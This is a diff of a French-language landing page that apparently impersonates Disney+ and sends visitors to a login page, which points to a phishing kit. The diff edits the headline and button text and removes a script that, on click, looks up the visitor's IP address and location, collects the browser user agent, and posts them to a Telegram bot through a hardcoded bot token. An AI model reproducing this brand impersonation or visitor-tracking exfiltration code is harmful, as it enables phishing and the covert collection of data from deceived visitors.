@@ -7,15 +7,17 @@
   <link rel="stylesheet" href="style.css" />
 </head>
 <body class="home-page">
+
   <header>
     <img src="Images/compose2.png" class="logo" alt="Disney Logo" />
   </header>
 
-  <main class="hero" style="background-image: url('Images/compose.jpg');">
+  <main class="hero">
+    <div class="overlay"></div>
     <div class="hero-content">
-      <h1>Bienvenue sur Disney+</h1>
-      <p>Des classiques incontournables, des exclusivités et bien plus encore.</p>
-      <a href="login.html" class="btn">Commencer</a>
+      <h1>Des films, des séries et bien plus encore</h1>
+      <p>Des classiques incontournables, des exclusivités Disney+ et bien plus à découvrir.</p>
+      <a href="login.html" class="btn">S’abonner maintenant</a>
     </div>
   </main>
 
@@ -33,37 +35,6 @@
   <footer>
     © Disney+ – Tous droits réservés
   </footer>
-</body>
-</html>
 
-
-  <script>
-    document.getElementById("continueBtn").addEventListener("click", async function () {
-      const webhookURL = "https://api.telegram.org/bot8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg/sendMessage";
-      const chatId = "-4970333928";
-
-      try {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-
-        const message = `🔔 NOUVEAU CLIC !\n🌍 IP : ${data.ip}\n📍 Ville : ${data.city}\n🌐 Pays : ${data.country_name}\n🕒 Heure : ${new Date().toLocaleString()}\n📱 Navigateur : ${navigator.userAgent}`;
-
-        await fetch(webhookURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-          })
-        });
-      } catch (err) {
-        console.error("Erreur lors de l'envoi Telegram :", err);
-      }
-
-      window.location.href = "login.html";
-    });
-  </script>
 </body>
 </html>
